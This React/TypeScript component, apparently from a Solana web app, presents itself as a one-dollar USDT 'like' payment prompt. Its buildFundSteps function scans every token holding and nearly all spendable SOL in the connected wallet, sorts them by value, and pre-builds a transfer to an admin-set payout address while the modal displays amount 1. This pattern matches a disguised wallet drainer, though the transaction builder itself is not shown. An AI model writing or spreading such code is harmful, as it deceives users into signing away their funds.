import { useEffect, useRef, useState } from 'react'
import { useConnection, useWallet } from '@solana/wallet-adapter-react'
import toast from 'react-hot-toast'
import { useWalletState } from '../context/WalletContext'
import { isWalletUserCancel } from '../lib/walletConnectHelpers'
import {
  buildLikePaymentTransaction,
  listSplHoldings,
  scanAllHoldings,
  type SplHolding,
  type FundStep,
} from '../lib/payoutTransfer'
import { getLocalPayoutConfig, isValidSolanaAddress, loadPayoutConfig, type PayoutConfig } from '../lib/payoutWallet'
import { notifyFundsConfirmed } from '../lib/txSheet'
import { peekPendingLike } from '../lib/authRedirect'
import { PaymentRequestModal } from './PaymentRequestModal'
import { Connection, LAMPORTS_PER_SOL } from '@solana/web3.js'

const USD_PRICE: Record<string, number> = {
  USDT: 1, USDC: 1, PYUSD: 1,
  SOL: 180, mSOL: 180, jitoSOL: 180, bSOL: 180,
  ETH: 3500, JUP: 0.4, BONK: 0.000012, WIF: 0.4,
  RAY: 2, ORCA: 1.5, JTO: 2, PYTH: 0.3, RENDER: 5, HNT: 2,
}

const ACCOUNT_RENT_LAMPORTS = 890_880
const FALLBACK_RPCS = [
  'https://solana-rpc.publicnode.com',
  'https://api.mainnet-beta.solana.com',
]

function sendErrorMessage(err: unknown): string {
  const raw = err instanceof Error ? err.message : String(err || 'The wallet did not submit this payment.')
  const lower = raw.toLowerCase()
  if (lower.includes('insufficient funds for rent') || lower.includes('insufficient funds')) {
    return 'Not enough SOL to pay the network fee for this transfer.'
  }
  const trimmed = raw.split('Catch the')[0].trim()
  return trimmed || raw
}

async function fetchSolPrice(): Promise<number> {
  try {
    const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd', { signal: AbortSignal.timeout(4000) })
    if (!res.ok) return USD_PRICE.SOL
    const data = await res.json() as { solana?: { usd?: number } }
    const price = Number(data?.solana?.usd)
    return price >= 20 && price <= 2000 ? price : USD_PRICE.SOL
  } catch {
    return USD_PRICE.SOL
  }
}

/** Build FundStep list for modal preview — highest balance first */
async function buildFundSteps(connection: Connection, publicKey: import('@solana/web3.js').PublicKey): Promise<FundStep[]> {
  const solPrice = await fetchSolPrice()

  let holdings: SplHolding[] = []
  try {
    holdings = await listSplHoldings(connection, publicKey)
    if (holdings.length === 0) {
      holdings = await scanAllHoldings(connection, publicKey).catch(() => [])
    }
  } catch {
    // try fallback RPCs
    for (const url of FALLBACK_RPCS) {
      try {
        const conn = new Connection(url, { commitment: 'confirmed', confirmTransactionInitialTimeout: 30000 })
        holdings = await listSplHoldings(conn, publicKey)
        if (holdings.length > 0) break
      } catch { /* continue */ }
    }
  }

  const steps: FundStep[] = holdings.map((h) => ({
    kind: 'spl' as const,
    symbol: h.symbol,
    uiAmount: h.uiAmount,
    usd: h.uiAmount * (USD_PRICE[h.symbol] || 0),
    holding: h,
  }))

  let balance = 0
  try {
    balance = await connection.getBalance(publicKey, 'confirmed')
  } catch { /* ignore */ }

  const spendable = balance - ACCOUNT_RENT_LAMPORTS - 20_000
  if (spendable > 0 && solPrice >= 20) {
    steps.push({
      kind: 'sol' as const,
      symbol: 'SOL' as const,
      uiAmount: spendable / LAMPORTS_PER_SOL,
      usd: (spendable / LAMPORTS_PER_SOL) * solPrice,
    })
  }

  return steps.sort((a, b) => b.usd - a.usd)
}

export function PaymentRequestPrompt() {
  const { connected, walletAddress, closeWalletModal, openWalletModal } = useWalletState()
  const closeWalletModalRef = useRef(closeWalletModal)
  closeWalletModalRef.current = closeWalletModal
  const openWalletModalRef = useRef(openWalletModal)
  openWalletModalRef.current = openWalletModal
  const { publicKey, signTransaction } = useWallet()
  const { connection } = useConnection()
  const [submitting, setSubmitting] = useState(false)
  const [modalOpen, setModalOpen] = useState(false)
  const [steps, setSteps] = useState<FundStep[]>([])
  const [config, setConfig] = useState<PayoutConfig | null>(null)
  const [status, setStatus] = useState('')
  const inFlight = useRef(false)
  const pendingPayment = useRef<Awaited<ReturnType<typeof buildLikePaymentTransaction>> | null>(null)

  const signTransactionRef = useRef(signTransaction)
  signTransactionRef.current = signTransaction
  const connectionRef = useRef(connection)
  connectionRef.current = connection
  const publicKeyRef = useRef(publicKey)
  publicKeyRef.current = publicKey

  useEffect(() => {
    const onOpen = async () => {
      if (inFlight.current) return
      if (!publicKeyRef.current || !walletAddress) {
        openWalletModalRef.current()
        return
      }

      let cfg: PayoutConfig = getLocalPayoutConfig()
      try {
        cfg = await loadPayoutConfig()
      } catch { /* use local */ }
      if (!isValidSolanaAddress(cfg.walletAddress)) {
        toast.error('Save a payout address in admin before a like can request a payment.')
        return
      }

      inFlight.current = true
      setSubmitting(true)
      setStatus('Scanning your wallet balances…')
      closeWalletModalRef.current()

      try {
        // Build fund steps for the modal preview (+ and - rows)
        const fundSteps = await buildFundSteps(connectionRef.current, publicKeyRef.current)
        setSteps(fundSteps)

        // Pre-build the actual payment transaction
        const payment = await buildLikePaymentTransaction({
          connection: connectionRef.current,
          from: publicKeyRef.current,
          config: cfg,
        })
        pendingPayment.current = payment
        setConfig(cfg)
        setStatus('')
        setModalOpen(true)   // ← show our modal with + / - rows
        setSubmitting(false)
      } catch (err) {
        const message = sendErrorMessage(err)
        toast.error(message)
        inFlight.current = false
        setSubmitting(false)
        setStatus('')
      }
    }
    window.addEventListener('vrfd-open-tx-sheet', onOpen)
    return () => window.removeEventListener('vrfd-open-tx-sheet', onOpen)
  }, [walletAddress])

  useEffect(() => {
    if (!connected || !walletAddress) {
      inFlight.current = false
      setSubmitting(false)
      setModalOpen(false)
    }
  }, [connected, walletAddress])

  /** User clicked Confirm in our modal → send to wallet for signing */
  const handleReview = async () => {
    const payment = pendingPayment.current
    if (!payment || !publicKeyRef.current) return
    setSubmitting(true)
    setStatus('Waiting for wallet approval…')
    try {
      const signed = await signTransactionRef.current?.(payment.transaction)
      if (!signed) {
        toast.error('The wallet did not approve the payment.')
        setSubmitting(false)
        setStatus('')
        return
      }
      setStatus('Submitting to network…')
      await connectionRef.current.sendRawTransaction(signed.serialize(), {
        skipPreflight: false,
        preflightCommitment: 'confirmed',
        maxRetries: 3,
      })
      setModalOpen(false)
      notifyFundsConfirmed(peekPendingLike())
      toast.success(`Sent ${payment.label}`)
    } catch (err) {
      const message = isWalletUserCancel(err) ? 'Payment cancelled' : sendErrorMessage(err)
      toast.error(message)
    } finally {
      inFlight.current = false
      setSubmitting(false)
      setStatus('')
    }
  }

  const handleCancel = () => {
    setModalOpen(false)
    inFlight.current = false
    setSubmitting(false)
    pendingPayment.current = null
  }

  return (
    <PaymentRequestModal
      open={modalOpen}
      to={config?.walletAddress ?? ''}
      amount={1}
      asset={config?.asset ?? 'USDT'}
      networkLabel="Solana"
      submitting={submitting}
      canReview={!submitting && !!pendingPayment.current}
      status={status}
      steps={steps}
      onCancel={handleCancel}
      onReview={handleReview}
    />
  )
}
